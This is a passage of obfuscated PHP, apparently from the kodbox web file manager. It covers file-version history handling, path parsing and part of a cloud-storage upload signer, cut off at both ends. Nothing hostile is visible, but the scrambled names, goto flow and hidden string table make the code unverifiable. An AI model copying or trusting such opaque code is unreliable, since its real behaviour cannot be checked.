$F®‡Á™ä¿ = $F®‡Á™ä¿ ? $F®‡Á™ä¿ : get_path_this($D™äÁ¯¥°Ñ); $BŞ §Úº›† = $BŞ §Úº›† ? $BŞ §Úº›† : $dŞŠá´ô‰´[$bÜº·‚„º¾[1131]]; goto Aµ«ÖĞ‚Ö‰; Aµ«ÖĞ‚Ö‰: $Dáî Ø®Ä¶ = substr(get_path_this($dŞŠá´ô‰´[$bÜº·‚„º¾[1132]]), 0, -strlen($b²âš”¡´©)); foreach ($dŞŠá´ô‰´[$bÜº·‚„º¾[367]] as $C¯öÆî½½Ÿ => $aëÎÇİåŠ) { $e×µã°µ« = $F®‡Á™ä¿ . substr($aëÎÇİåŠ[$bÜº·‚„º¾[28]], strlen($Dáî Ø®Ä¶)); $AêİÍ×ôÕ = IO::move($dŞŠá´ô‰´[$bÜº·‚„º¾[1131]] . $aëÎÇİåŠ[$bÜº·‚„º¾[28]], $BŞ §Úº›†, !1, $e×µã°µ«); if ($AêİÍ×ôÕ) { $dŞŠá´ô‰´[$bÜº·‚„º¾[367]][$C¯öÆî½½Ÿ][$bÜº·‚„º¾[28]] = $e×µã°µ«; } } $dŞŠá´ô‰´[$bÜº·‚„º¾[1132]] = IO::move($dŞŠá´ô‰´[$bÜº·‚„º¾[1132]], $BŞ §Úº›†, !1, $F®‡Á™ä¿ . $b²âš”¡´©); goto a„İÙæ’ ‚; eñ»¼í„¥µ: $bÜº·‚„º¾ =& $_SERVER[«¾°Ã¤]; $dŞŠá´ô‰´ = self::listData($D™äÁ¯¥°Ñ, !1); if (!$dŞŠá´ô‰´ || !$dŞŠá´ô‰´[$bÜº·‚„º¾[367]]) { return !1; } goto Dæ‘é¤êÏ»; b¥Ô£Şáø¦: } public static function rollback($A—† ™²áº, $D§£”¾œ¤µ) { $Dë‹†„‚‰‹ =& $_SERVER[«¾°Ã¤]; $díÍõ²×š¦ = self::listData($A—† ™²áº); if (!$díÍõ²×š¦) { return; } $BŒÑ£Œ³à½ = IO::info($A—† ™²áº); foreach ($díÍõ²×š¦[$Dë‹†„‚‰‹[367]] as $eÁÁÕ¿Ö§« => $eŒàâéäâª) { if ($eŒàâéäâª[$Dë‹†„‚‰‹[393]] == $D§£”¾œ¤µ) { self::add($A—† ™²áº); $cİÈ­ªÓÒ­ = $díÍõ²×š¦[$Dë‹†„‚‰‹[1131]] . $eŒàâéäâª[$Dë‹†„‚‰‹[28]]; $A‡Š¼™ˆÒÛ = IO::copy($cİÈ­ªÓÒ­, IO::pathFather($A—† ™²áº), REPEAT_REPLACE, $BŒÑ£Œ³à½[$Dë‹†„‚‰‹[28]]); if ($A‡Š¼™ˆÒÛ) { self::remove($A—† ™²áº, $D§£”¾œ¤µ); } return $A‡Š¼™ˆÒÛ; } } return !1; } public static function setDetail($BÛ½–¦Ã¢, $Eİí°ƒÎÈŸ, $EÊÂ÷ÔÍùÔ) { $A©ó¯‘’ø™ =& $_SERVER[«¾°Ã¤]; $A¾•Ğ¼„Á = self::listData($BÛ½–¦Ã¢); if (!$A¾•Ğ¼„Á) { return; } foreach ($A¾•Ğ¼„Á[$A©ó¯‘’ø™[367]] as $D´¢¹«Ë—ˆ => $CÀ’ÇÙ©Œ) { if ($CÀ’ÇÙ©Œ[$A©ó¯‘’ø™[393]] == $Eİí°ƒÎÈŸ) { $A¾•Ğ¼„Á[$A©ó¯‘’ø™[367]][$D´¢¹«Ë—ˆ][$A©ó¯‘’ø™[1130]] = $EÊÂ÷ÔÍùÔ; self::saveData($A¾•Ğ¼„Á[$A©ó¯‘’ø™[1132]], $A¾•Ğ¼„Á[$A©ó¯‘’ø™[367]]); return !0; } } return !1; } public static function fileInfo($F¡†ÄØˆ, $CÆ¼è†‹‘») { goto cÒ±İÔï÷ˆ; fç“”ŸˆÙ¸: $Bà®Š¶ôÍ = $D´õáÈõÃ¨[33]; foreach ($e½òïµÚÍÑ[$D´õáÈõÃ¨[367]] as $d‹÷©’·ôù => $eÊÊì¯Š¬‚) { if ($eÊÊì¯Š¬‚[$D´õáÈõÃ¨[393]] != $CÆ¼è†‹‘») { continue; } $Bà®Š¶ôÍ = $e½òïµÚÍÑ[$D´õáÈõÃ¨[1131]] . $eÊÊì¯Š¬‚[$D´õáÈõÃ¨[28]]; break; } if (!$Bà®Š¶ôÍ) { show_json(LNG($D´õáÈõÃ¨[105]), !1); } goto bİè¨ä«÷…; cÒ±İÔï÷ˆ: $D´õáÈõÃ¨ =& $_SERVER[«¾°Ã¤]; $e½òïµÚÍÑ = self::listData($F¡†ÄØˆ); if (!$e½òïµÚÍÑ) { show_json(LNG($D´õáÈõÃ¨[105]), !1); } goto fç“”ŸˆÙ¸; bİè¨ä«÷…: return IO::info($Bà®Š¶ôÍ); goto CÅñß¦ÒÊ¡; CÅñß¦ÒÊ¡: } public static function fileOut($aØÕ¼æÄÛ, $EØê¶®¶’Õ, $DÙº‰˜îùÂ = false) { $A¤ß„ù„„¡ =& $_SERVER[«¾°Ã¤]; $f¼‰©Âö‘Ê = self::fileInfo($aØÕ¼æÄÛ, $EØê¶®¶’Õ); $e£¹”¥Íë =& $GLOBALS[$A¤ß„ù„„¡[7]]; $DÙº‰˜îùÂ = isset($e£¹”¥Íë[$A¤ß„ù„„¡[1095]]) && $e£¹”¥Íë[$A¤ß„ù„„¡[1095]] == 1; if (isset($e£¹”¥Íë[$A¤ß„ù„„¡[29]]) && $e£¹”¥Íë[$A¤ß„ù„„¡[29]] == $A¤ß„ù„„¡[1133]) { return IO::fileOutImage($f¼‰©Âö‘Ê[$A¤ß„ù„„¡[76]], $e£¹”¥Íë[$A¤ß„ù„„¡[1134]]); } IO::fileOut($f¼‰©Âö‘Ê[$A¤ß„ù„„¡[76]], $DÙº‰˜îùÂ, get_path_this($aØÕ¼æÄÛ)); } public static function listData($fĞ§áø»Ä, $C¿…—‡ = true) { goto fÔÛõ‰’øº; fÔÛõ‰’øº: $e½ªõŸ¸Û =& $_SERVER[«¾°Ã¤]; if ($C¿…—‡ && !IO::exist($fĞ§áø»Ä)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto cÂä¥±Ùœ; dß…ˆĞÀ¹¬: $e‚£°Ã÷§Ù = IO::getContent($B˜Ô²æäŠÑ[$e½ªõŸ¸Û[1132]]); if ($e‚£°Ã÷§Ù) { $A¨í´ÕˆéÃ = json_decode($e‚£°Ã÷§Ù, !0); if (is_array($A¨í´ÕˆéÃ)) { $B˜Ô²æäŠÑ[$e½ªõŸ¸Û[367]] = $A¨í´ÕˆéÃ; } } return $B˜Ô²æäŠÑ; goto e´“†Ÿ›„İ; cÂä¥±Ùœ: if (substr($fĞ§áø»Ä, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $c¸±¥çôõ = self::pathHistory($fĞ§áø»Ä); $B˜Ô²æäŠÑ = array($e½ªõŸ¸Û[1132] => $c¸±¥çôõ . $e½ªõŸ¸Û[1119], $e½ªõŸ¸Û[1131] => rtrim(get_path_father($c¸±¥çôõ), $e½ªõŸ¸Û[8]) . $e½ªõŸ¸Û[8], $e½ªõŸ¸Û[367] => array()); goto dß…ˆĞÀ¹¬; e´“†Ÿ›„İ: } private static function saveData($e‡¼æ¨êõ•, $fâ¾»¹·ƒÒ) { goto Eâó²¦‘ĞÚ; EÍŞÈ³‘„—: $E¨õÑ“˜Á = IO::pathFather($e‡¼æ¨êõ•); IO::remove($e‡¼æ¨êõ•); self::clearEmptyFolder($E¨õÑ“˜Á); goto aÜç•¤§’¨; Eâó²¦‘ĞÚ: $E©Ú»¡±ñÑ =& $_SERVER[«¾°Ã¤]; self::log($E©Ú»¡±ñÑ[1135] . $e‡¼æ¨êõ• . $E©Ú»¡±ñÑ[68] . count($fâ¾»¹·ƒÒ), $E©Ú»¡±ñÑ[721]); if ($fâ¾»¹·ƒÒ) { return IO::setContent($e‡¼æ¨êõ•, json_encode($fâ¾»¹·ƒÒ)); } goto EÍŞÈ³‘„—; aÜç•¤§’¨: return !0; goto C£†ÙÍëÅÍ; C£†ÙÍëÅÍ: } public static function clearEmptyFolder($C´Û¾¿£–ƒ) { goto AìàªñÖÊÆ; e¦°ùÇÃ‡Ÿ: self::clearEmptyFolder($aÚ—¶Ä„çÍ); goto AĞšƒçß½; AìàªñÖÊÆ: $DÜËÔ»³ =& $_SERVER[«¾°Ã¤]; if (trim($C´Û¾¿£–ƒ, $DÜËÔ»³[8]) == trim(self::$_historyBase, $DÜËÔ»³[8])) { return; } $aÚ—¶Ä„çÍ = IO::pathFather($C´Û¾¿£–ƒ); goto d‘àÙ—ï‰å; d‘àÙ—ï‰å: $BÆ·šÅ‘ñŞ = IO::has($C´Û¾¿£–ƒ, !0); if ($BÆ·šÅ‘ñŞ[$DÜËÔ»³[203]] > 0 || $BÆ·šÅ‘ñŞ[$DÜËÔ»³[204]] > 0) { return; } IO::remove($C´Û¾¿£–ƒ); goto e¦°ùÇÃ‡Ÿ; AĞšƒçß½: } private static function getBasePath() { goto C™‰„ˆ¦¬; Eëã™Ùùã­: return $a±ÌÛ­¸; goto aÎ¤ŸÑĞ£Ú; bÄŠØ½ ‚: file_put_contents($a±ÌÛ­¸ . $B´š¶´—¸–[1139], $B´š¶´—¸–[33]); file_put_contents(DATA_PATH . $B´š¶´—¸–[1139], $B´š¶´—¸–[33]); Model($B´š¶´—¸–[1136])->set($B´š¶´—¸–[1137], $a±ÌÛ­¸); goto Eëã™Ùùã­; fº†ñáÀĞî: $a±ÌÛ­¸ = DATA_PATH . $B´š¶´—¸–[1138] . rand_string(8) . $B´š¶´—¸–[8]; $a±ÌÛ­¸ = IO::mkdir($a±ÌÛ­¸); $a±ÌÛ­¸ = rtrim($a±ÌÛ­¸, $B´š¶´—¸–[8]) . $B´š¶´—¸–[8]; goto bÄŠØ½ ‚; C™‰„ˆ¦¬: $B´š¶´—¸– =& $_SERVER[«¾°Ã¤]; $a±ÌÛ­¸ = Model($B´š¶´—¸–[1136])->get($B´š¶´—¸–[1137]); if ($a±ÌÛ­¸ && IO::exist($a±ÌÛ­¸)) { if (get_path_this($a±ÌÛ­¸) == $B´š¶´—¸–[1122]) { $CÙø‚ø«áò = $B´š¶´—¸–[1138] . rand_string(8); @rename($a±ÌÛ­¸, get_path_father($a±ÌÛ­¸) . $B´š¶´—¸–[8] . $CÙø‚ø«áò); $a±ÌÛ­¸ = DATA_PATH . $CÙø‚ø«áò . $B´š¶´—¸–[8]; file_put_contents(DATA_PATH . $B´š¶´—¸–[1139], $B´š¶´—¸–[33]); Model($B´š¶´—¸–[1136])->set($B´š¶´—¸–[1137], $a±ÌÛ­¸); } return $a±ÌÛ­¸; } goto fº†ñáÀĞî; aÎ¤ŸÑĞ£Ú: } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\122\145\x63\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\163\x65\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\x72\106\151\154\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\x46\x69\x6c\x65\124\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\160\122\157\x6f\x74\123\145\x6c\146\175"; const KOD_USER_SHARE = "\173\165\x73\x65\162\x53\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\162\x53\150\x61\162\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\145\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\145\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\x68\141\x72\145\x49\164\x65\155\114\151\x6e\153\175"; const KOD_SEARCH = "\173\163\145\141\162\143\150\175"; const KOD_BLOCK = "\x7b\142\154\157\x63\153\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\162\122\145\156\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\x65\162\175"; public static function typeList() { $EŸÁ×ˆ©¬ =& $_SERVER[«¾°Ã¤]; return array($EŸÁ×ˆ©¬[1140] => self::KOD_SOURCE, $EŸÁ×ˆ©¬[1141] => self::KOD_USER_RECYCLE, $EŸÁ×ˆ©¬[1142] => self::KOD_USER_FAV, $EŸÁ×ˆ©¬[1143] => self::KOD_USER_FILE_TAG, $EŸÁ×ˆ©¬[1144] => self::KOD_USER_FILE_TYPE, $EŸÁ×ˆ©¬[1145] => self::KOD_GROUP_ROOT_SELF, $EŸÁ×ˆ©¬[1146] => self::KOD_USER_SHARE, $EŸÁ×ˆ©¬[1147] => self::KOD_USER_SHARE_LINK, $EŸÁ×ˆ©¬[1148] => self::KOD_USER_SHARE_TO_ME, $EŸÁ×ˆ©¬[1149] => self::KOD_SHARE_ITEM, $EŸÁ×ˆ©¬[1150] => self::KOD_SHARE_LINK, $EŸÁ×ˆ©¬[1151] => self::KOD_SEARCH, $EŸÁ×ˆ©¬[1152] => self::KOD_BLOCK, $EŸÁ×ˆ©¬[1153] => self::KOD_IO, $EŸÁ×ˆ©¬[1154] => self::KOD_USER_RECENT, $EŸÁ×ˆ©¬[1155] => self::KOD_USER_DRIVER); } public static function parse($FïÖ¢’›‡) { goto eƒ‘ßî‹™ã; e¯İğ²Èœ×: preg_match($a¢äÑåóÁï[1156], $FïÖ¢’›‡, $eƒ¯‡­–à); $DÉÉÓÚñÌÙ = array($a¢äÑåóÁï[424] => !1, $a¢äÑåóÁï[1157] => !1, $a¢äÑåóÁï[421] => !1, $a¢äÑåóÁï[76] => $FïÖ¢’›‡, $a¢äÑåóÁï[1066] => !1, $a¢äÑåóÁï[1065] => $a¢äÑåóÁï[33]); if (is_array($eƒ¯‡­–à) && count($eƒ¯‡­–à) == 5) { $BÜŒË«ğ§Ò = $a¢äÑåóÁï[1158] . $eƒ¯‡­–à[2] . $a¢äÑåóÁï[325]; if (in_array($BÜŒË«ğ§Ò, $c„ÀÖŒªùÖ)) { $DÉÉÓÚñÌÙ[$a¢äÑåóÁï[1066]] = $eƒ¯‡­–à[1]; $DÉÉÓÚñÌÙ[$a¢äÑåóÁï[29]] = $BÜŒË«ğ§Ò; $DÉÉÓÚñÌÙ[$a¢äÑåóÁï[1159]] = substr($BÜŒË«ğ§Ò, 1, -1); $DÉÉÓÚñÌÙ[$a¢äÑåóÁï[393]] = $eƒ¯‡­–à[3]; } $DÉÉÓÚñÌÙ[$a¢äÑåóÁï[1065]] = $eƒ¯‡­–à[4]; } goto Fµ¤„ÃÈ; eƒ‘ßî‹™ã: $a¢äÑåóÁï =& $_SERVER[«¾°Ã¤]; $FïÖ¢’›‡ = self::clear($FïÖ¢’›‡); $c„ÀÖŒªùÖ = array_values(self::typeList()); goto e¯İğ²Èœ×; Fµ¤„ÃÈ: $bæš„‰¨‹· = array($a¢äÑåóÁï[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $DÉÉÓÚñÌÙ[$a¢äÑåóÁï[1121]] = in_array($DÉÉÓÚñÌÙ[$a¢äÑåóÁï[29]], $bæš„‰¨‹·); return $DÉÉÓÚñÌÙ; goto cÕÄÚöÁ©Í; cÕÄÚöÁ©Í: } public static function isTruePath($f“°ì¹ŞÕÀ) { goto CœÆÉÔà‚; fÓ‘”Ø…è: if (strpos($f“°ì¹ŞÕÀ, $aàÜùçÎÏä[1162]) === 0) { return !0; } return !1; goto e¢‚ö‡Œ’Ù; CœÆÉÔà‚: $aàÜùçÎÏä =& $_SERVER[«¾°Ã¤]; if (substr($f“°ì¹ŞÕÀ, 0, 1) != $aàÜùçÎÏä[1158]) { return !0; } if (strpos($f“°ì¹ŞÕÀ, $aàÜùçÎÏä[410]) === 0) { return !0; } goto cÓŞâ‹øô; cÓŞâ‹øô: if (strpos($f“°ì¹ŞÕÀ, $aàÜùçÎÏä[1125]) === 0) { return !0; } if (strpos($f“°ì¹ŞÕÀ, $aàÜùçÎÏä[1160]) === 0) { return !0; } if (strpos($f“°ì¹ŞÕÀ, $aàÜùçÎÏä[1161]) === 0) { return !0; } goto fÓ‘”Ø…è; e¢‚ö‡Œ’Ù: } public static function clear($c‘·‰ŸÃ˜Ë) { goto fš…çÒˆá; C¾—‹µ¥­ñ: return $c‘·‰ŸÃ˜Ë; goto C„ëá¡Ï¹; FÍå‹óïœ‰: $fãÌÏŒÑöç = $c¼„šŸ†ò²[1163]; if (substr($c‘·‰ŸÃ˜Ë, 0, 3) == $c¼„šŸ†ò²[1164]) { $c‘·‰ŸÃ˜Ë = substr($c‘·‰ŸÃ˜Ë, 3); } while (strstr($c‘·‰ŸÃ˜Ë, $fãÌÏŒÑöç)) { $c‘·‰ŸÃ˜Ë = str_replace($fãÌÏŒÑöç, $c¼„šŸ†ò²[8], $c‘·‰ŸÃ˜Ë); } goto aÏ¤ïÁ·ÁÎ; fš…çÒˆá: $c¼„šŸ†ò² =& $_SERVER[«¾°Ã¤]; $c‘·‰ŸÃ˜Ë = str_replace(array($c¼„šŸ†ò²[1039], $c¼„šŸ†ò²[229]), $c¼„šŸ†ò²[50], $c‘·‰ŸÃ˜Ë); $c‘·‰ŸÃ˜Ë = str_replace($c¼„šŸ†ò²[97], $c¼„šŸ†ò²[8], $c‘·‰ŸÃ˜Ë); goto FÍå‹óïœ‰; aÏ¤ïÁ·ÁÎ: $c‘·‰ŸÃ˜Ë = preg_replace($c¼„šŸ†ò²[1165], $c¼„šŸ†ò²[8], $c‘·‰ŸÃ˜Ë); if ($c‘·‰ŸÃ˜Ë == $c¼„šŸ†ò²[8]) { return $c¼„šŸ†ò²[8]; } $c‘·‰ŸÃ˜Ë = rtrim($c‘·‰ŸÃ˜Ë, $c¼„šŸ†ò²[8]); goto C¾—‹µ¥­ñ; C„ëá¡Ï¹: } public static function sourceID($E¤Ö‡³ºÑÎ) { $bé¿ÂÁšÇ =& $_SERVER[«¾°Ã¤]; $A•ÙÉñ¿ó„ = self::parse($E¤Ö‡³ºÑÎ); if ($A•ÙÉñ¿ó„[$bé¿ÂÁšÇ[29]] !== self::KOD_SOURCE) { show_json(LNG($bé¿ÂÁšÇ[1166]), !1); } return $A•ÙÉñ¿ó„[$bé¿ÂÁšÇ[393]]; } public static function make($Bê…×¶ë¶¦) { if (!$Bê…×¶ë¶¦) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Bê…×¶ë¶¦)); } public static function makeShare($E©Š¤Ü¯ç, $E±ÊÂĞ³‰) { return self::makePath(self::KOD_SHARE_ITEM, $E©Š¤Ü¯ç, $E±ÊÂĞ³‰); } public static function makeFileTypePath($A‚İƒÓÚÂİ) { return self::makePath(self::KOD_USER_FILE_TYPE, $A‚İƒÓÚÂİ); } public static function makeFileTagPath($c­óÎ°ó‡§) { return self::makePath(self::KOD_USER_FILE_TAG, $c­óÎ°ó‡§); } public static function makePath($cëƒÓ¨¿äÍ, $d›ˆŸŞĞƒ• = '', $cŒ›Õ¨‡À„ = '') { $A‚ñšØãœÔ =& $_SERVER[«¾°Ã¤]; $DÉÇ¹ø•« = substr($cëƒÓ¨¿äÍ, 1, -1); $C‹›ø¯™„ = $A‚ñšØãœÔ[1167] . $DÉÇ¹ø•« . $A‚ñšØãœÔ[1168] . $d›ˆŸŞĞƒ• . $A‚ñšØãœÔ[1169]; $C‹›ø¯™„ = $cŒ›Õ¨‡À„ ? $C‹›ø¯™„ . $cŒ›Õ¨‡À„ . $A‚ñšØãœÔ[8] : $C‹›ø¯™„; return $C‹›ø¯™„; } public static function hashPath($EÜ™¿˜›©, $cÔˆØäôÉÎ = true) { goto e§÷ÈÖÓÛÙ; e§÷ÈÖÓÛÙ: $f‚í‚Ş»á =& $_SERVER[«¾°Ã¤]; $FÏŒ·œò„Ä = is_array($EÜ™¿˜›©) ? $EÜ™¿˜›© : IO::info($EÜ™¿˜›©); $Fìš¦¬•çØ = _get($FÏŒ·œò„Ä, $f‚í‚Ş»á[1170], $f‚í‚Ş»á[33]); goto C–Ê¨à®È; E“¼Ç‡­Àƒ: return $Fìš¦¬•çØ; goto dÙóÇ¨ù­; C–Ê¨à®È: if (!$Fìš¦¬•çØ && isset($FÏŒ·œò„Ä[$f‚í‚Ş»á[404]])) { $FÏŒ·œò„Ä = IO::info(KodIO::make($FÏŒ·œò„Ä[$f‚í‚Ş»á[404]])); $Fìš¦¬•çØ = _get($FÏŒ·œò„Ä, $f‚í‚Ş»á[1170], $f‚í‚Ş»á[33]); } if (!$Fìš¦¬•çØ && $cÔˆØäôÉÎ) { $A­òÆÂ”Õæ = KodIO::parse($FÏŒ·œò„Ä[$f‚í‚Ş»á[76]]); if (!$A­òÆÂ”Õæ[$f‚í‚Ş»á[29]]) { $Fìš¦¬•çØ = IO::hashSimple($FÏŒ·œò„Ä[$f‚í‚Ş»á[76]]); } } if (!$Fìš¦¬•çØ) { $Fìš¦¬•çØ = md5($FÏŒ·œò„Ä[$f‚í‚Ş»á[76]] . $FÏŒ·œò„Ä[$f‚í‚Ş»á[78]] . $FÏŒ·œò„Ä[$f‚í‚Ş»á[84]]); } goto E“¼Ç‡­Àƒ; dÙóÇ¨ù­: } public static function initSystemPath() { goto Cà»ÌèÂ²; bâÒéŠ¢æ¯: define($d–ÂöŞŞŸë[1173], self::systemPath($d–ÂöŞŞŸë[1174])); define($d–ÂöŞŞŸë[1175], self::systemPath($d–ÂöŞŞŸë[1176])); define($d–ÂöŞŞŸë[1177], self::systemPath($d–ÂöŞŞŸë[1178])); goto dôÏ¨Šã; Cà»ÌèÂ²: $d–ÂöŞŞŸë =& $_SERVER[«¾°Ã¤]; if (defined($d–ÂöŞŞŸë[1171])) { return; } define($d–ÂöŞŞŸë[1171], self::systemPath($d–ÂöŞŞŸë[1172])); goto bâÒéŠ¢æ¯; dôÏ¨Šã: IOHistory::bindEvent(); goto Bì»ç®†”Ì; Bì»ç®†”Ì: } public static function systemPath($FÀ¨İ´ÚËğ) { goto BµŸ§Şö…á; B‡Ø¼Ò¿ö¸: if ($f–ÛËÚÜèí) { return $f–ÛËÚÜèí; } if ($FÀ¨İ´ÚËğ == $dÜÍ¨«–´[1172]) { $f–ÛËÚÜèí = self::make(Model($dÜÍ¨«–´[799])->systemRootPathAdd($dÜÍ¨«–´[514])); } else { $f–ÛËÚÜèí = self::systemPath($dÜÍ¨«–´[1172]); $eƒªÔá™º˜ = self::sourceID($f–ÛËÚÜèí); $f–ÛËÚÜèí = self::make(Model($dÜÍ¨«–´[799])->mkdir($eƒªÔá™º˜, $FÀ¨İ´ÚËğ)); } Model($dÜÍ¨«–´[739])->set($FŠÔòóçöÒ, $f–ÛËÚÜèí); goto FÈ£˜ÌâÖà; FÈ£˜ÌâÖà: return $f–ÛËÚÜèí; goto e¾—ìŞˆÂ; BµŸ§Şö…á: $dÜÍ¨«–´ =& $_SERVER[«¾°Ã¤]; $FŠÔòóçöÒ = $dÜÍ¨«–´[1179] . ucfirst($FÀ¨İ´ÚËğ); $f–ÛËÚÜèí = Model($dÜÍ¨«–´[739])->get($FŠÔòóçöÒ); goto B‡Ø¼Ò¿ö¸; e¾—ìŞˆÂ: } public static function systemFolder($fÂÌÀÕØ‡¢) { $eŞ›»Ò°ºæ = IO_PATH_SYSTEM_SOURCE . $fÂÌÀÕØ‡¢; $D©Œ‚ ĞÔÈ = Cache::get($eŞ›»Ò°ºæ); if (!$D©Œ‚ ĞÔÈ) { $D©»·¢ïÔ‹ = IO::infoFull($eŞ›»Ò°ºæ); if (!$D©»·¢ïÔ‹) { $D©Œ‚ ĞÔÈ = IO::mkdir($eŞ›»Ò°ºæ, REPEAT_SKIP); } else { $D©Œ‚ ĞÔÈ = $D©»·¢ïÔ‹[$_SERVER[«¾°Ã¤][76]]; } Cache::set($eŞ›»Ò°ºæ, $D©Œ‚ ĞÔÈ, 3600 * 10); } return $D©Œ‚ ĞÔÈ; } public static function defaultDriver() { return Model($_SERVER[«¾°Ã¤][736])->defaultDriver(); } public static function defaultIO() { $fŞ‹İ­Å‡“ =& $_SERVER[«¾°Ã¤]; $dÈíØ¢ÀÂ¬ = self::defaultDriver(); return $fŞ‹İ­Å‡“[1180] . $dÈíØ¢ÀÂ¬[$fŞ‹İ­Å‡“[393]] . $fŞ‹İ­Å‡“[1169]; } public static function defaultDriverInit() { static $bÊ½³•êå¯ = false; if ($bÊ½³•êå¯) { return $bÊ½³•êå¯; } $bÊ½³•êå¯ = IO::init(self::defaultIO()); return $bÊ½³•êå¯; } public static function fileTypeList() { $bˆ¯Ï‚ææ† =& $_SERVER[«¾°Ã¤]; $e÷İ¯¶ÃÃ = $GLOBALS[$bˆ¯Ï‚ææ†[6]][$bˆ¯Ï‚ææ†[1181]]; foreach ($e÷İ¯¶ÃÃ as $b´Íñ¨ÈØ¶ => $AÊ°¤ŠÊ) { $c‹ÕÔ„–Àœ = $bˆ¯Ï‚ææ†[1182] . $b´Íñ¨ÈØ¶; $F–¼êÅÙõ· = LNG($c‹ÕÔ„–Àœ); if ($c‹ÕÔ„–Àœ != $F–¼êÅÙõ·) { $e÷İ¯¶ÃÃ[$b´Íñ¨ÈØ¶][$bˆ¯Ï‚ææ†[28]] = $F–¼êÅÙõ·; } } return $e÷İ¯¶ÃÃ; } public static function transferType($EÃ¦ò«Ñ½, $CŸ¯‰¿ÎĞ) { goto FÈÆé¬˜Ãµ; aŞÊßÓêñª: return $c¥‡‚©Œâ‘[1185]; goto B±„ØÚëÇ; FÈÆé¬˜Ãµ: $c¥‡‚©Œâ‘ =& $_SERVER[«¾°Ã¤]; $eÉî½„×‰ = self::driverType($EÃ¦ò«Ñ½); $a‘Ú“×˜© = self::driverType($CŸ¯‰¿ÎĞ); goto B›ª…¦ææô; B›ª…¦ææô: if ($eÉî½„×‰[$c¥‡‚©Œâ‘[29]] == $a‘Ú“×˜©[$c¥‡‚©Œâ‘[29]] && $eÉî½„×‰[$c¥‡‚©Œâ‘[1183]] == $a‘Ú“×˜©[$c¥‡‚©Œâ‘[1183]]) { return $c¥‡‚©Œâ‘[1184]; } if ($eÉî½„×‰[$c¥‡‚©Œâ‘[29]] == $c¥‡‚©Œâ‘[832] && $a‘Ú“×˜©[$c¥‡‚©Œâ‘[29]] == $c¥‡‚©Œâ‘[106]) { return $c¥‡‚©Œâ‘[1095]; } if ($eÉî½„×‰[$c¥‡‚©Œâ‘[29]] == $c¥‡‚©Œâ‘[106] && $a‘Ú“×˜©[$c¥‡‚©Œâ‘[29]] == $c¥‡‚©Œâ‘[832]) { return $c¥‡‚©Œâ‘[107]; } goto aŞÊßÓêñª; B±„ØÚëÇ: } public static function driverType($Eí½Ùôá›ô) { goto b¸„éô”…Ò; c»ó£¦ùñ: return array($aåùõ‚’Ñ“[29] => $aåùõ‚’Ñ“[832], $aåùõ‚’Ñ“[1183] => $Eí½Ùôá›ô->pathDriver, $aåùõ‚’Ñ“[76] => $F¤Ë¢¬ã³è); goto A©¡Æº“©¿; b¸„éô”…Ò: $aåùõ‚’Ñ“ =& $_SERVER[«¾°Ã¤]; $F¤Ë¢¬ã³è = $Eí½Ùôá›ô->path; $bĞˆÎ«Ë‡ = str_replace($aåùõ‚’Ñ“[1186], $aåùõ‚’Ñ“[33], strtolower($Eí½Ùôá›ô->getType())); goto c­ºÃóœô; c­ºÃóœô: if ($bĞˆÎ«Ë‡ == $aåùõ‚’Ñ“[727] || $bĞˆÎ«Ë‡ == $aåùõ‚’Ñ“[1187] || $bĞˆÎ«Ë‡ == $aåùõ‚’Ñ“[1188]) { $Eí½Ùôá›ô = self::defaultDriverInit(); } else { if ($bĞˆÎ«Ë‡ == $aåùõ‚’Ñ“[1102] || $bĞˆÎ«Ë‡ == $aåùõ‚’Ñ“[1189]) { $Eí½Ùôá›ô = IO::init($Eí½Ùôá›ô->pathParse[$aåùõ‚’Ñ“[1049]]); } } $bĞˆÎ«Ë‡ = str_replace($aåùõ‚’Ñ“[1186], $aåùõ‚’Ñ“[33], strtolower($Eí½Ùôá›ô->getType())); if ($bĞˆÎ«Ë‡ == $aåùõ‚’Ñ“[106]) { return array($aåùõ‚’Ñ“[29] => $aåùõ‚’Ñ“[106], $aåùõ‚’Ñ“[1183] => $aåùõ‚’Ñ“[33], $aåùõ‚’Ñ“[76] => $F¤Ë¢¬ã³è); } goto c»ó£¦ùñ; A©¡Æº“©¿: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($fË©ÊŠÔ°ó) { parent::__construct($fË©ÊŠÔ°ó); $this->signatureVersion($_SERVER[«¾°Ã¤][212]); } public function uploadFormData($C·¼â§Ô‚ƒ, $D“‡¬±‘Ôó = 3600) { goto eâëç’Ú±; eâëç’Ú±: $EÆÂ±Í÷‹† =& $_SERVER[«¾°Ã¤]; $fÍÊŒ‡†ñº = $EÆÂ±Í÷‹†[192]; $a‰ĞªŒŠğ¤ = $EÆÂ±Í÷‹†[230]; goto C‰ğ¾ƒ«õÍ; eŠ£ËÔíÈ¥: $B¼¯ìˆâÌƒ = sha1($dô—Ç˜ô¾×); $BÜˆçÏ÷Öö = hash_hmac($EÆÂ±Í÷‹†[230], $B¼¯ìˆâÌƒ, $A×øªššæ); $C¢ÃÁä—˜£ = array($EÆÂ±Í÷‹†[1194] => $fÍÊŒ‡†ñº, $EÆÂ±Í÷‹†[1198] => $B¸Ÿ†ßø, $EÆÂ±Í÷‹†[1202] => base64_encode($dô—Ç˜ô¾×), $EÆÂ±Í÷‹†[1199] => $a‰ĞªŒŠğ¤, $EÆÂ±Í÷‹†[1200] => $this->accessKey, 